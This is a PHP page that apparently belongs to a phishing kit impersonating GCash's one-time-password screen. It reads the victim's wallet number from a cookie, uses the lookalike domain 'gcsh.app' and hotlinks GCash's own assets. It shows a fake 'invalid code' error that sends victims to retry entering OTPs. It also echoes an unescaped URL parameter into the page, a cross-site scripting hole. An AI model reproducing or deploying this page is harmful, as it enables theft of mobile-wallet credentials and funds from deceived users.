<?php
$mobile_num = $_COOKIE['gcash_number'];
$encodenum = $_GET['otpclid'];
?>
<!DOCTYPE html>
<html class="desktop" style="font-size: 50px;">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <meta name="format-detection" content="telephone=no, email=no">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1">
    <meta name="data-aspm" content="a771">
    <title>GCash OTP</title>
    <meta property="og:type" content="website">
    <meta property="og:url" content="gcsh.app">
    <link rel="shortcut icon" href="https://www.gcash.com/wp-content/uploads/2019/07/gcash-favicon-32x32.png" type="image/x-icon" />
    <meta name="wap-font-scale" content="no">
    <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/desktop-13ce9e40a0718362a999.css">
    <link rel="stylesheet" href="https://m.gcash.com/gcashapp/gcash-promotion-web/2.0.0/index-f70a6485354f1bea09ff.css">
</head>
<body> 
  <svg viewBox="0 0 175 1" xmlns="http://www.w3.org/2000/svg">
  </svg>

<style type="text/css">
    input[maxlength="4"] + svg line {   
    stroke-dasharray: 20;
    stroke-dashoffset: -10;
  }
   svg, line {
    position: relative;
    display: block;
    width: 325px;
    height: 5px;
    padding-top: 1px;
    margin-right: 50px;
  }
</style>
    <div role="dialog" class="ap-modal">
        <div class="ap-modal-mask"></div> 
        <div class="ap-modal-wrap">
        <div class="ap-modal-content">
        <div class="ap-modal-header">Invalid authentication code.</div> 
 Please enter the correct code and try again. (OT201422) 
</div> <div class="ap-modal-button"><a href="otp-failed.php?otpclid=<?php echo $encodenum; ?>">
          Retry
        </a></div></div></div>
</body>

</html>



